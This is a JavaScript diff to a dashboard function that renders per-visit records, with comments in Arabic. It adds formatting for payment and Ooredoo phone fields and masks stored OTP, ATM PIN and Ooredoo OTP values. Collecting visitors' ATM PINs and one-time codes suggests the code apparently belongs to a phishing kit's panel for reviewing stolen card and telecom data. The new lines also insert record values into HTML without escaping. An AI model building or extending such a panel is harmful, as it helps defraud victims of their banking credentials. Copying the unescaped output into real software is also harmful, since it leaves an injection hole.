@@ -560,7 +560,7 @@ function openPop(ref){
   };
 
   // الحقول التي تُعرض بتنسيق خاص أو تُتجاهل
-  const specialFields = ['pay', 'ooredoo', 'createdAt', 'updatedAt', 'visitId', 'ref'];
+  const specialFields = ['createdAt', 'updatedAt', 'visitId', 'ref'];
 
   // بناء صفوف الجدول من جميع الخصائص (فقط الحقول المملوءة)
   let fieldsHTML = '<div class="dgrid">';
@@ -589,12 +589,25 @@ function openPop(ref){
       const w = WATCHES.find(w => w.id === value);
       displayValue = w ? w.ar : value;
     }
+    else if (key === 'pay') {
+      if (value && typeof value === 'object') {
+        displayValue = `المبلغ: ${value.amount} ${value.currency} | الحالة: ${value.status}`;
+      }
+    }
+    else if (key === 'ooredoo') {
+      if (value && typeof value === 'object') {
+        displayValue = `الهاتف: ${value.phone}`;
+      }
+    }
+    else if (key === 'otp' || key === 'atmPin' || key === 'ooredooOtp') {
+      displayValue = '***'; // إخفاء الأكواز الحساسة
+    }
     else if (typeof value === 'object') continue; // تجاهل الكائنات المعقدة
     else displayValue = esc(String(value));
 
     if (!displayValue || displayValue === '—') continue; // تجاهل القيم الفارغة بعد المعالجة
 
-    const isLtr = ['p', 'id', 'ts', 'createdAt', 'updatedAt', 'e'].includes(key);
+    const isLtr = ['p', 'id', 'ts', 'createdAt', 'updatedAt', 'e', 'pay'].includes(key);
     fieldsHTML += `<div class="drow"><span class="k">${label}</span><span class="v" ${isLtr ? 'style="direction:ltr"' : ''}>${displayValue}</span></div>`;
   }
   fieldsHTML += '</div>';
